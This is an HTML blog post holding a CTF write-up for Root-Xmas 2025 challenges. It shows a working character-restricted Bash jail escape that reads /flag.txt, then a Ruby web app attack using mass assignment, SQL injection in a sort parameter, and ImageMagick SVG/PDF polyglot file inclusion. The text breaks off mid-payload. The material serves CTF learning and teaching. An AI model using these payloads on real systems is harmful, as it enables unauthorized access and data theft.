@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Root-Xmas 2025 | Writeup Selection | Yours, Sto ʚɞ</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap">
+
+      <script src="/js/main.js"></script>
+
+
+<meta name="description" content="Writeups for a selection of Root-Xmas 2025 challenges.">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Root-Xmas 2025 | Writeup Selection">
+<meta property="og:description" content="Writeups for a selection of Root-Xmas 2025 challenges.">
+<meta property="og:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Root-Xmas 2025 | Writeup Selection">
+<meta name="twitter:description" content="Writeups for a selection of Root-Xmas 2025 challenges.">
+<meta name="twitter:image" content="http://localhost:1313/thumbnail.png">
+
+
+</head>
+<body>
+  <header>
+    <a href="/"><h3>Yours, Sto ʚɞ</h3></a>
+
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    <li>
+      <a href="/whoami/">Whoami</a>
+    </li>
+    </ul>
+  </nav>
+
+</div>
+
+  </header>
+  <main>
+    
+  <h1>Root-Xmas 2025 | Writeup Selection</h1>
+
+    
+      <p class="date">Oct 27, 2025</p>
+    
+
+
+    
+    
+  <div class="tags">
+    
+    <ul>
+        <li><a href="/tags/bash/">#Bash</a></li>
+        <li><a href="/tags/ruby/">#Ruby</a></li>
+        <li><a href="/tags/awk/">#Awk</a></li>
+        <li><a href="/tags/privesc/">#Privesc</a></li>
+    </ul>
+  </div>
+
+    
+    <div class="content">
+      <p>Once more, Root-Xmas CTF was back this year, and once more, it was the highlight of the month 🎀 This blog post details three of my challenges&rsquo; solutions for the Days 8, 11 and 18, including a Bash jail, a Ruby web app and an <code>awk</code> privesc.</p>
+<p>To speak my heart, I really learned a lot during this CTF as the web aficionada that I am had to get out of her comfort zone and really tryhard reverse, hardware, crypto, pwn, etc. In fact, from each challenge of the twenty which I validated, I did gain not only a flag, but also several new insights.</p>
+<p>Kudos to the entire staff 🤍 One could really feel the creativity and care that were put in each of the challenges.</p>
+<p>Anyway, that was a long intro, so let&rsquo;s get started.</p>
+<p><img src="cover.png" alt="thumbnail"></p>
+<h2 id="day-8---merry-christmas--youre-trapped">Day 8 - Merry Christmas | You&rsquo;re trapped</h2>
+<p><strong>Tags</strong>: <em>Medium, misc, bash, jail</em></p>
+<p><strong>Description :</strong></p>
+<p>The Grinch has kidnapped Santa&rsquo;s Chief Management Officer Elf, a key figure responsible for coordinating present delivery all around the world.<br>
+We need to get him out as soon as possible!<br>
+This is urgent, please help us set him free from the the Grinch&rsquo;s freezing jail!! The success of Christmas depends on it.</p>
+<hr>
+<p>We are given the following Bash jail script which we need to escape and read the flag :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/getconf PATH <span style="color:#f92672">||</span> /bin/kill $$<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#######################################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#              |&gt;&gt;&gt;                    |&gt;&gt;&gt;          #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#              |                       |             #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#          _  _|_  _               _  _|_  _         #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         |;|_|;|_|;|             |;|_|;|_|;|        #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         \\..      /             \\..      /        #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#          \\..    /               \\..    /         #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#           \\..  /                 \\..  /          #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#            ||||                     ||||           #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#            ||||                     ||||           #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   ______________________________________________   #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  /______________________________________________/| #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |                                              | | #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |      |   |   |   |   |   |   |   |   |       | | #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |      |___|___|___|___|___|___|___|___|       | | #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |                                              | | #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |              &#34;Help me please...&#34;             | | #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># |______________________________________________|/  #</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#######################################################</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> check_input<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $1 <span style="color:#f92672">=</span>~ <span style="color:#e6db74">&#39;..&#39;</span> <span style="color:#f92672">||</span> $1 <span style="color:#f92672">=</span>~ <span style="color:#e6db74">&#39;./&#39;</span> <span style="color:#f92672">||</span> $1 <span style="color:#f92672">=</span>~ <span style="color:#f92672">[[</span>:space:<span style="color:#f92672">]]</span><span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">]]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $1 <span style="color:#f92672">=</span>~ <span style="color:#f92672">[[</span>:alnum:<span style="color:#f92672">][</span>:space:<span style="color:#f92672">]]</span> <span style="color:#f92672">]]</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $1 <span style="color:#f92672">=</span>~ <span style="color:#e6db74">&#39;&lt;&#39;</span> <span style="color:#f92672">||</span> $1 <span style="color:#f92672">=</span>~ <span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">]]</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Todo remove this shit... it can be retrieved by the player ?! &gt;_&lt;</span>
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat <span style="color:#e6db74">&#34;/flag.txt&#34;</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> :
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    input<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    echo -n <span style="color:#e6db74">&#34;Enter the input: &#34;</span>
+</span></span><span style="display:flex;"><span>    read input
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> check_input <span style="color:#e6db74">&#34;</span>$input<span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#&amp;&amp; false</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                echo -e <span style="color:#e6db74">&#39;\033[0;31mRestricted characters has been used\033[0m&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>env -i PATH<span style="color:#f92672">=</span>$HOME/bin/ /bin/bash --noprofile --norc --restricted -c <span style="color:#e6db74">&#34;</span>$input<span style="color:#e6db74">&#34;</span> &lt; /dev/null<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                echo <span style="color:#e6db74">&#34;Command executed&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>                             
+</span></span></code></pre></div><p>In the main loop, our input is read from standard input and :</p>
+<ul>
+<li>If <code>check_input &quot;$input&quot;</code> returns true (<code>0</code>), the input is rejected.</li>
+<li>If it returns false (<code>1</code>), the input is executed inside a restricted Bash environment:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>env -i PATH<span style="color:#f92672">=</span>$HOME/bin/ /bin/bash --noprofile --norc --restricted -c <span style="color:#e6db74">&#34;</span>$input<span style="color:#e6db74">&#34;</span> &lt; /dev/null
+</span></span></code></pre></div><p>One key restriction of <code>--restricted</code> Bash is that it forbids using <code>/</code> in command names.</p>
+<p>Looking at <code>check_input()</code>, the input is rejected if:</p>
+<ul>
+<li>It contains <code>..</code>, <code>./</code>, or a space immediately followed by <code>/</code></li>
+<li>It contains any alphanumeric character or any space</li>
+<li>It contains <code>&lt;</code> or <code>&gt;</code></li>
+</ul>
+<p>If any of these conditions are met, the input is considered invalid.
+This leaves us with the following allowed character set:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>! <span style="color:#e6db74">&#34; # </span>$<span style="color:#e6db74"> % &amp; &#39; ( ) * + , - . : ; = ? @ [ \ ] ^ _ ` { | } ~
+</span></span></span></code></pre></div><p>Our flag is in <code>/flag.txt</code>, so we need to read this file using only the allowed characters, while also bypassing the restrictions imposed by <code>restricted</code> Bash.</p>
+<p>Although the character set is extremely limited, Bash still supports variable assignment and expansion, so let&rsquo;s leverage that to flag! Our goal is to construct the payload <code>cat /flag.txt</code>. Furthermore, since we only see error output, we need to intentionally trigger an error so that the result of <code>cat /flag.txt</code> is displayed.</p>
+<p>We have the binary <code>/bin/cat</code> in <code>/root/bin/</code> so we can use it.<br>
+We use <code>__=(~/???/???)</code> to reference <code>/bin/cat</code> and we need to extract the <code>cat</code> portion from it.<br>
+We can create <code>0</code> with <code>___=$[]</code> (empty arithmetic expression that defaults to 0) which allows us to index and extract the content of the string.<br>
+Then, using bash <a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html">parameter expansion and pattern matching</a>, we extract the <code>cat</code> part, by extracting the last portion after the last <code>/</code>. Let&rsquo;s test this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Enter the input: __<span style="color:#f92672">=(</span>~/???/???<span style="color:#f92672">)</span>;___<span style="color:#f92672">=</span>$<span style="color:#f92672">[]</span>;__<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__[$___]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;___<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__##*/<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;$___?   
+</span></span><span style="display:flex;"><span>/bin/bash: line 1: cat?: command not found
+</span></span></code></pre></div><p>This input initializes an array referencing <code>/bin/cat</code>, creates an index with value <code>0</code>, and then extracts the cat string from the array. Finally, it extracts the last portion of the string that follows the last <code>/</code>. (We add the <code>?</code> to trigger an error to be able to see the output). In a nutshell, our <code>cat</code> can be written as :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>__<span style="color:#f92672">=(</span>~/???/???<span style="color:#f92672">)</span>;___<span style="color:#f92672">=</span>$<span style="color:#f92672">[]</span>;__<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__[$___]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;___<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__##*/<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;$___
+</span></span></code></pre></div><p>We reference <code>/flag.txt</code> using the same procedure :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>__<span style="color:#f92672">=(</span>/????.???<span style="color:#f92672">)</span>;___<span style="color:#f92672">=</span>$<span style="color:#f92672">[]</span>;__<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__[$___]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;$__                                                 
+</span></span></code></pre></div><p>Finally, to force an error, we can simply evaluate the result of <code>cat /flag.txt</code> as a bash command and since we cannot use spaces, we run the command using <code>${cat,/flag.txt}</code>.</p>
+<p>Final payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Enter the input: __<span style="color:#f92672">=(</span>~/???/???<span style="color:#f92672">)</span>;___<span style="color:#f92672">=</span>$<span style="color:#f92672">[]</span>;__<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__[$___]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;___<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>__##*/<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;<span style="color:#66d9ef">$(</span><span style="color:#f92672">{</span>$___,/????.???<span style="color:#f92672">}</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>/bin/bash: line 1: RM<span style="color:#f92672">{</span>0mG_Y3S_1_kn3w_y0u_w0uld_h3lp_m3_w3_r3_601n6_70_s4ve_CH1stM4s_70637h3r_TY_S0_MUCH_FOR_s4v1ngME<span style="color:#f92672">&lt;&lt;&lt;</span>3<span style="color:#f92672">}</span>: command not found
+</span></span><span style="display:flex;"><span>Command executed
+</span></span></code></pre></div><hr>
+<h2 id="day-11---ticket-tracker">Day 11 - Ticket Tracker</h2>
+<p><strong>Tags</strong>: <em>Hard, web, Ruby</em></p>
+<p><strong>Description :</strong></p>
+<p>Take Santa&rsquo;s sleigh to navigate through the depths of Ruby, where you will find the flag.</p>
+<hr>
+<p>In this challenge, we are given a web application where we can we can create tickets and upload attachments (images or PDFs) for which thumbnails will be generated. We can see from the source files that our flag is the admin password so we need to extract that somehow.
+We first think about an SQL injection, and while looking through the files we observe the following code :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:sort</span><span style="color:#f92672">].</span>present?
+</span></span><span style="display:flex;"><span>    @tickets <span style="color:#f92672">=</span> @tickets<span style="color:#f92672">.</span>order(<span style="color:#66d9ef">Arel</span><span style="color:#f92672">.</span>sql(params<span style="color:#f92672">[</span><span style="color:#e6db74">:sort</span><span style="color:#f92672">]</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    @tickets <span style="color:#f92672">=</span> @tickets<span style="color:#f92672">.</span>order(<span style="color:#e6db74">created_at</span>: <span style="color:#e6db74">:desc</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>This is textbook SQL injection in the <code>sort</code> parameter. Nevertheless, to get be able to exploit it, we first need to access the admin panel. Let&rsquo;s try to achieve that.</p>
+<p>I will not detail everything as the <a href="https://elweth.fr/writeups/Root-Me_-_XMAS_2025/Day_11_-_TicketTracker">author&rsquo;s writeup</a> explains well the entirety of the challenge, Nevertheless, I will focus on what I did differently, so kinda the <em>unintended</em> solution ^^</p>
+<p>For the first part, I did as the original writeup : I exploited the mass assignment to create an account validated by the admin using the payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;user&#34;</span>:
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;email&#34;</span>:<span style="color:#e6db74">&#34;test@test&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;validated&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>}}
+</span></span></code></pre></div><p>Even though our role is <code>admin</code>, our user ID is 2, and we know that the admin panel is only accessible with the first user ID given the code snippet below :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">require_admin</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unless</span> @current_user <span style="color:#f92672">&amp;&amp;</span> @current_user<span style="color:#f92672">.</span>id <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>      render <span style="color:#e6db74">json</span>: { <span style="color:#e6db74">error</span>: <span style="color:#e6db74">&#39;Access denied.&#39;</span> }, <span style="color:#e6db74">status</span>: <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>Hence, our next goal is to takeover the admin account. Given the following code, the session cookie of each user is written into the file <code>/tmp/sess_&lt;user_session_id&gt;</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;securerandom&#39;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;json&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomSessionStore</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">SESSION_DIR</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/tmp&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#f92672">&lt;&lt;</span> self
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_session</span>(user_id)
+</span></span><span style="display:flex;"><span>      session_id <span style="color:#f92672">=</span> <span style="color:#66d9ef">SecureRandom</span><span style="color:#f92672">.</span>hex(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>      session_data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">user_id</span>: user_id,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">created_at</span>: <span style="color:#66d9ef">Time</span><span style="color:#f92672">.</span>now<span style="color:#f92672">.</span>to_i
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      session_file <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>join(<span style="color:#66d9ef">SESSION_DIR</span>, <span style="color:#e6db74">&#34;sess_</span><span style="color:#e6db74">#{</span>session_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(session_file, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>file<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>        file<span style="color:#f92672">.</span>write(<span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(session_data))
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      session_id
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_session</span>(session_id)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span> <span style="color:#66d9ef">unless</span> session_id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      session_file <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>join(<span style="color:#66d9ef">SESSION_DIR</span>, <span style="color:#e6db74">&#34;sess_</span><span style="color:#e6db74">#{</span>session_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span> <span style="color:#66d9ef">unless</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>exist?(session_file)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">begin</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(session_file, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>file<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>load(file<span style="color:#f92672">.</span>read)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">rescue</span> <span style="color:#f92672">=&gt;</span> e
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">Rails</span><span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>error <span style="color:#e6db74">&#34;Session load error: </span><span style="color:#e6db74">#{</span>e<span style="color:#f92672">.</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">destroy_session</span>(session_id)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">unless</span> session_id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      session_file <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>join(<span style="color:#66d9ef">SESSION_DIR</span>, <span style="color:#e6db74">&#34;sess_</span><span style="color:#e6db74">#{</span>session_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>delete(session_file) <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>exist?(session_file)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_user_from_session</span>(session_id)
+</span></span><span style="display:flex;"><span>      session_data <span style="color:#f92672">=</span> load_session(session_id)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span> <span style="color:#66d9ef">unless</span> session_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">User</span><span style="color:#f92672">.</span>find_by(id: session_data<span style="color:#f92672">[</span><span style="color:#e6db74">:user_id</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span> 
+</span></span></code></pre></div><p>Hence, if we manage to obtain the admin&rsquo;s <code>session_id</code>, we will gain access to their admin account. Let&rsquo;s try to achieve this using the tickets which we can create.</p>
+<p>After digging a bit more into the challenge source code, I did not see a clear vulnerability that we could use. However, given that we can upload files, maybe we can find a way to exploit that feature especially with the custom thumbnail generation function.<br>
+With only PDFs and images, we cannot do much but maybe we can do more?<br>
+After reading this great <a href="https://www.synacktiv.com/en/publications/playing-with-imagetragick-like-its-2016#footnote8_d5xu6ed">Synacktiv post</a>, I first tried using the <strong>PDF/PostScript polyglot</strong> approach, but did not manage to make it work correctly as my PostScript was not executed.<br>
+Therefore, I focused on SVGs as, in my previous attempt, I succeeded creating PDF/SVGs due to the parser confusion. After several options for many hours, I found this <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">article</a> that underlines the <code>VID</code> format which enables <strong>filename expansions</strong> and I quote :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>The call of ExpandFilenames means that the VID scheme accepts masks, and constructs filepaths using them.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Therefore, by using the vid: scheme, we can include our temporary file with the MSL content without knowing its name
+</span></span></code></pre></div><p>This was a turning point. I first tried to include the session file content in the SVG as an MSL as the article suggsted but that was in vain (and that makes sense as our session file is not a valid MSL) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;SVG</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;100&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#75715e">&lt;!--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">%PDF-1.3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;rect</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;1000&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;1000&#34;</span> <span style="color:#a6e22e">fill=</span><span style="color:#e6db74">&#34;green&#34;</span><span style="color:#f92672">/&gt;</span>
